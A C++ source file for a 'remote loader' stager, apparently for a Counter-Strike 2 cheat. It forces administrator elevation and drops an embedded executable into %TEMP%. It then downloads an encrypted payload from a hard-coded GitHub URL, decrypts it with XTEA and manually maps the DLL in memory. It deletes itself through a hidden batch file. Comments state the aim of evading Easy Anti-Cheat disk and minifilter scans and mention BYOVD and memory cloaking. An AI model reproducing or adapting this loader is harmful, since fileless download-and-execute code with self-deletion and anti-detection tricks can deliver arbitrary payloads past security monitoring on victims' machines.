// ============================================================
// loader.cpp �?远程加载 Stager
//
// 架构:
//   1. WinHTTP 从服务器下载加密 Payload
//   2. 内存�?XTEA+CBC 解密
//   3. 使用 ManualMapper 映射 DLL 到当前进�?
//   4. 调用 DllMain(DLL_PROCESS_ATTACH)
//   5. 自删�?(规避 EAC 文件扫描)
//
// 磁盘上仅短暂存在 loader.exe 本身 (启动后立即自删除),
// Payload 全程在内存中, 不落盘�?
// ============================================================

#include <windows.h>
#include <wininet.h>
#include <shellapi.h>
#pragma comment(lib, "wininet.lib")
#include <cstdint>
#include <cstdio>
#include <cstdarg>
#include <vector>
#include <string>
#include "embedded_basic_loader.h"  // v3.32: 嵌入基础.exe

// ============================================================
// ★ v3.38: loader 专用诊断日志 — 写 %TEMP%\loader_diag.log + FlushFileBuffers
//   用于定位 payload DllMain 之前的早期崩溃
// ============================================================
static void LoaderDiag(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    int len = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, args);
    va_end(args);
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"loader_diag.log");
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        FlushFileBuffers(h);
        CloseHandle(h);
    }
}

// ★ v3.38: 未处理异常过滤器 — 在 DllMain 之前崩溃时弹出诊断信息
static LONG WINAPI LoaderCrashHandler(PEXCEPTION_POINTERS ep) {
    DWORD code = ep->ExceptionRecord->ExceptionCode;
    uint64_t addr = (uint64_t)ep->ExceptionRecord->ExceptionAddress;

    LoaderDiag("LOADER-CRASH: code=0x%08X addr=0x%llX\n", code, addr);

    wchar_t msg[512];
    swprintf_s(msg, L"Loader.exe 崩溃\n\n"
                     L"异常代码: 0x%08X\n"
                     L"崩溃地址: 0x%llX\n\n"
                     L"诊断日志:\n"
                     L"  %%TEMP%%\\loader_diag.log\n"
                     L"  %%TEMP%%\\stealth_diag.log",
        code, addr);
    MessageBoxW(NULL, msg, L"Loader 崩溃诊断", MB_OK | MB_ICONERROR | MB_TOPMOST);
    return EXCEPTION_EXECUTE_HANDLER; // 终止进程
}

// v3.37: 确保管理员权限
// 首次运行时无 --elevated 标记 → 通过 ShellExecute runas 重新启动自身
// 重启后带 --elevated 标记 → 直接继续, 避免无限循环
static void EnsureAdminPrivileges() {
    // 检测命令行中是否已有 --elevated 标记 (防止无限重启动)
    LPWSTR cmdLine = GetCommandLineW();
    if (wcsstr(cmdLine, L"--elevated")) {
        return; // 已经是第二次启动, 直接继续
    }

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb       = L"runas";
    sei.lpFile       = exePath;
    sei.lpParameters = L"--elevated";
    sei.nShow        = SW_SHOWNORMAL;

    if (ShellExecuteExW(&sei)) {
        ExitProcess(0);  // UAC 弹窗→用户同意→新管理员进程启动→旧进程退出
    }
    // 如果 ShellExecuteEx 失败 (UAC 禁用 / 已管理员),
    // 继续执行 — 由 payload.dll 内部的 BYOVD 进一步判断权限
}

// ============================================================
// 配置�?(部署时修�?
// ============================================================

// Payload 下载地址 — 从 GitHub 下载
static const wchar_t* PAYLOAD_URL = L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/56f92f3b3c30b232488409d32504eac68782bad5/payload.dat";

// 下载超时 (毫秒)
static const DWORD DOWNLOAD_TIMEOUT_MS = 30000;

// ============================================================
// XTEA 解密 (�?encrypt.cpp 配套)
// ============================================================

static constexpr uint32_t XTEA_DELTA = 0x9E3779B9;
static constexpr uint32_t XTEA_KEY[4] = {
    0x7B2E1A4F, 0xC9D83560, 0x4A1F93E7, 0xE8056B2C
};

static void XteaDecryptBlock(uint32_t& v0, uint32_t& v1) {
    uint32_t sum = 0xC6EF3720; // 32 * DELTA
    for (int i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + XTEA_KEY[(sum >> 11) & 3]);
        sum -= XTEA_DELTA;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + XTEA_KEY[sum & 3]);
    }
}

static void XteaDecryptCBC(uint8_t* data, size_t size) {
    uint32_t iv0 = 0xDEADBEEF;
    uint32_t iv1 = 0xCAFEBABE;

    auto* blocks = reinterpret_cast<uint32_t*>(data);
    // ★ v3.69: XTEA 以 8 字节块为单位, 确保块数为偶数避免越界读取
    size_t numBlocks = (size / 4) & ~1ULL; // round down to even

    for (size_t i = 0; i < numBlocks; i += 2) {
        uint32_t saved0 = blocks[i];
        uint32_t saved1 = blocks[i+1];

        XteaDecryptBlock(blocks[i], blocks[i+1]);

        blocks[i]   ^= iv0;
        blocks[i+1] ^= iv1;

        iv0 = saved0;
        iv1 = saved1;
    }
}

// ============================================================
// HTTP 下载
// ============================================================

static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
    std::vector<uint8_t> result;

    // v3.39: 加随机查询参数 — 绕 GitHub CDN 缓存
    wchar_t cacheBustedUrl[512];
    swprintf_s(cacheBustedUrl, L"%ls?nocache=%u", url, GetTickCount());

    HINTERNET hInet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
                                    nullptr, nullptr, 0);
    if (!hInet) {
        LoaderDiag("  FAIL: InternetOpen err=%u\n", GetLastError());
        return result;
    }

    DWORD timeout = DOWNLOAD_TIMEOUT_MS;
    InternetSetOptionW(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionW(hInet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hUrl = InternetOpenUrlW(hInet, cacheBustedUrl, nullptr, 0,
                                      INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD |
                                      INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hUrl) {
        LoaderDiag("  FAIL: InternetOpenUrl err=%u\n", GetLastError());
        InternetCloseHandle(hInet);
        return result;
    }

    std::vector<uint8_t> buf(65536);
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, buf.data(), 65536, &bytesRead) && bytesRead > 0) {
        size_t oldSize = result.size();
        result.resize(oldSize + bytesRead);
        memcpy(result.data() + oldSize, buf.data(), bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);
    LoaderDiag("  Downloaded %zu bytes\n", result.size());
    return result;
}

// ============================================================
// 自删�?�?启动批处理延迟删除自身文�?
// ============================================================

static void SelfDelete() {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    wchar_t batPath[MAX_PATH];
    GetTempPathW(MAX_PATH, batPath);
    wcscat_s(batPath, L"~cln.bat");

    // 写入自删除批处理
    HANDLE hBat = CreateFileW(batPath, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hBat != INVALID_HANDLE_VALUE) {
        const char* batContent =
            "@echo off\r\n"
            ":retry\r\n"
            "del /f \"%~1\" 2>nul\r\n"
            "if exist \"%~1\" goto retry\r\n"
            "del /f \"%~0\" 2>nul\r\n";
        DWORD written;
        WriteFile(hBat, batContent, static_cast<DWORD>(strlen(batContent)),
                  &written, nullptr);
        CloseHandle(hBat);

        // 以隐藏窗口启�?
        wchar_t cmdLine[512];
        swprintf_s(cmdLine, L"/c \"\"%s\" \"%s\"\"", batPath, selfPath);
        ShellExecuteW(nullptr, L"open", L"cmd.exe", cmdLine, nullptr, SW_HIDE);
    }
}

// ============================================================
// 最小化 PE 手动映射�?(不依�?stealth_lib, 独立实现)
//
// 纯内存操�? download �?decrypt �?VirtualAlloc manual map
// 不写磁盘 �?规避 EAC minifilter 文件系统监控
// VAD伪装交由 payload 端的 SelfCloaker 处理
// ============================================================

struct MinimalMapResult {
    bool     success;
    uint8_t* imageBase;
    size_t   imageSize;
    FARPROC  entryPoint;
};

#define SECTION_MAP_EXECUTE    0x0008
// 全程纯内存操�? download �?decrypt �?VirtualAlloc manual map
// VAD伪装交由 payload 端的 SelfCloaker 处理
// (已移�?SEC_IMAGE 磁盘路径 �?规避 EAC minifilter)

static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize) {
    MinimalMapResult result = {};

    // --- 1. 校验 PE 签名 ---
    if (dllSize < sizeof(IMAGE_DOS_HEADER)) return result;
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dllData);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return result;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    uintptr_t preferredBase = nt->OptionalHeader.ImageBase;

    // --- 2. 纯内�?VirtualAlloc (无磁盘写�? 规避 EAC minifilter) ---
    auto* imageBase = reinterpret_cast<uint8_t*>(
        VirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!imageBase) return result;

    // --- 3. 复制 PE 头和区段 ---
    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(imageBase, dllData, headerSize);

    auto* firstSection = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (firstSection[i].SizeOfRawData > 0) {
            memcpy(imageBase + firstSection[i].VirtualAddress,
                   dllData + firstSection[i].PointerToRawData,
                   firstSection[i].SizeOfRawData);
        }
    }

    // --- 4. 基址重定�?---
    uintptr_t delta = reinterpret_cast<uintptr_t>(imageBase) - preferredBase;
    if (delta != 0) {
        auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress && relocDir.Size) {
            auto* reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                imageBase + relocDir.VirtualAddress);
            auto* relocEnd = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                imageBase + relocDir.VirtualAddress + relocDir.Size);

            while (reloc < relocEnd && reloc->SizeOfBlock) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                auto* entries = reinterpret_cast<const WORD*>(reloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        auto* patch = reinterpret_cast<uintptr_t*>(
                            imageBase + reloc->VirtualAddress + (entries[j] & 0xFFF));
                        *patch += delta;
                    }
                }
                reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<const uint8_t*>(reloc) + reloc->SizeOfBlock);
            }
        }
    }

    // --- 5. 导入表解�?(预加载loader目录下的 pthread DLL) ---
    wchar_t loaderDir[MAX_PATH];
    GetModuleFileNameW(nullptr, loaderDir, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(loaderDir, L'\\');
    if (lastSlash) *(lastSlash + 1) = L'\0';

    static const wchar_t* preloadDlls[] = { L"libwinpthread-1.dll" };
    for (const auto* dll : preloadDlls) {
        wchar_t fullPath[MAX_PATH];
        wcscpy_s(fullPath, loaderDir);
        wcscat_s(fullPath, dll);
        if (!LoadLibraryW(fullPath)) {
            LoadLibraryW(dll);
        }
    }

    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress && importDir.Size) {
        auto* importDesc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
            imageBase + importDir.VirtualAddress);

        for (int i = 0; importDesc[i].Name; i++) {
            auto dllName = reinterpret_cast<const char*>(
                imageBase + importDesc[i].Name);
            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) hMod = GetModuleHandleA(dllName);
            if (!hMod) continue;

            auto* thunk = reinterpret_cast<uintptr_t*>(
                imageBase + importDesc[i].FirstThunk);
            auto* origThunk = reinterpret_cast<uintptr_t*>(
                imageBase + (importDesc[i].OriginalFirstThunk
                    ? importDesc[i].OriginalFirstThunk
                    : importDesc[i].FirstThunk));

            for (int j = 0; origThunk[j]; j++) {
                if (origThunk[j] & IMAGE_ORDINAL_FLAG64) {
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, MAKEINTRESOURCEA(
                            origThunk[j] & 0xFFFF)));
                } else {
                    auto* importByName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                        imageBase + origThunk[j]);
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, importByName->Name));
                }
            }
        }
    }

    // --- 6. 设置区段保护 ---
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READWRITE;
        DWORD ch = firstSection[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE)
            prot = (ch & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (!(ch & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_READONLY;
        if (firstSection[i].Misc.VirtualSize > 0) {
            DWORD oldProt;
            VirtualProtect(imageBase + firstSection[i].VirtualAddress,
                           firstSection[i].Misc.VirtualSize, prot, &oldProt);
        }
    }

    auto entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    result.success = true;
    result.imageBase = imageBase;
    result.imageSize = imageSize;
    result.entryPoint = reinterpret_cast<FARPROC>(imageBase + entryRVA);
    return result;
}

// ============================================================
// 主入�?(WinMain �?无控制台窗口)
// ============================================================

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // ★ v3.38: 最早注册未处理异常处理器 (在 DllMain 之前, 捕获 loader 本体崩溃)
    SetUnhandledExceptionFilter(LoaderCrashHandler);
    LoaderDiag("=== LOADER v3.38 START ===\n");

    // v3.37: 强制管理员权限 — 自动以 runas + --elevated 重新启动
    LoaderDiag("STEP1: EnsureAdminPrivileges...\n");
    EnsureAdminPrivileges();

    // v3.37: 释放嵌入的基础.exe 到 %TEMP% (供 payload.dll 启动)
    LoaderDiag("STEP2: WriteBasicToTemp...\n");
    {
        wchar_t basicPath[MAX_PATH];
        GetTempPathW(MAX_PATH, basicPath);
        wcscat_s(basicPath, L"basic_esp.exe");
        HANDLE h = CreateFileW(basicPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(h, EMBEDDED_BASIC_EXE, (DWORD)EMBEDDED_BASIC_EXE_SIZE, &written, nullptr);
            CloseHandle(h);
            LoaderDiag("STEP2: OK (%u bytes)\n", written);
        } else {
            LoaderDiag("STEP2: FAILED (err=%u)\n", GetLastError());
            MessageBoxW(NULL, L"无法写入 basic.exe 到 %TEMP%。\n请检查磁盘空间和权限。",
                L"写入失败", MB_OK | MB_ICONERROR);
            return 1;
        }
    }

    // --- 1. 从 GitHub 下载 Payload ---
    LoaderDiag("STEP3: DownloadPayload...\n");
    std::vector<uint8_t> encryptedData = DownloadPayload(PAYLOAD_URL);

    if (encryptedData.size() < 8) {
        LoaderDiag("STEP3: FAILED (size=%zu)\n", encryptedData.size());
        MessageBoxW(NULL,
            L"Payload 下载失败。\n\n"
            L"可能原因:\n"
            L"  - 网络连接不可用\n"
            L"  - GitHub 访问受限\n"
            L"  - 防火墙拦截\n\n"
            L"请检查网络后重试。",
            L"下载失败", MB_OK | MB_ICONERROR);
        return 1;
    }
    LoaderDiag("STEP3: OK (%zu bytes)\n", encryptedData.size());

    // --- 2. 解密 Payload ---
    LoaderDiag("STEP4: DecryptPayload...\n");
    uint32_t originalSize = *reinterpret_cast<uint32_t*>(encryptedData.data());
    size_t encryptedPayloadSize = encryptedData.size() - sizeof(uint32_t);

    // ★ v3.69: 校验 payload 下界 (至少需要完整 PE 头, 1 页面)
    if (originalSize < 0x1000 || originalSize > 100 * 1024 * 1024) {
        LoaderDiag("STEP4: FAILED (originalSize=%u)\n", originalSize);
        MessageBoxW(NULL, L"Payload 解密失败: 数据大小异常。",
            L"解密失败", MB_OK | MB_ICONERROR);
        return 2;
    }

    uint8_t* payloadBuf = encryptedData.data() + sizeof(uint32_t);

    // XTEA CBC 解密 (原地)
    LoaderDiag("STEP4: decrypting %zu bytes...\n", encryptedPayloadSize);
    XteaDecryptCBC(payloadBuf, encryptedPayloadSize);
    LoaderDiag("STEP4: OK (decrypted size=%u)\n", originalSize);

    // --- 3. ManualMap 到当前进程 ---
    LoaderDiag("STEP5: MinimalManualMap (size=%u)...\n", originalSize);
    auto mapResult = MinimalManualMap(payloadBuf, originalSize);
    if (!mapResult.success) {
        LoaderDiag("STEP5: FAILED\n");
        MessageBoxW(NULL, L"Payload 内存加载失败 (ManualMap)。\n请确认系统兼容性。",
            L"加载失败", MB_OK | MB_ICONERROR);
        return 3;
    }
    LoaderDiag("STEP5: OK (base=0x%p size=%zu entry=0x%p)\n",
        mapResult.imageBase, mapResult.imageSize, mapResult.entryPoint);

    // --- 0. 成功加载后自删除 (规避 EAC 磁盘扫描) ---
    LoaderDiag("STEP6: SelfDelete...\n");
    SelfDelete();
    LoaderDiag("STEP6: OK\n");

    // --- 4. 调用 DllMain(DLL_PROCESS_ATTACH) ---
    // DllMain 在当前线程上直接运行 CheatMainLoop (不创建额外线程),
    // 从此处开始 loader.exe 进程进入无限循环, 永不返回
    LoaderDiag("STEP7: Calling DllMain @ 0x%p...\n", mapResult.entryPoint);
    using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
    auto dllMain = reinterpret_cast<DllMainFn>(mapResult.entryPoint);
    dllMain(reinterpret_cast<HINSTANCE>(mapResult.imageBase),
            DLL_PROCESS_ATTACH, nullptr);

    // 不会到达这里 (CheatMainLoop 永不返回)
    LoaderDiag("=== LOADER v3.38 END (unreachable) ===\n");
    return 0;
}
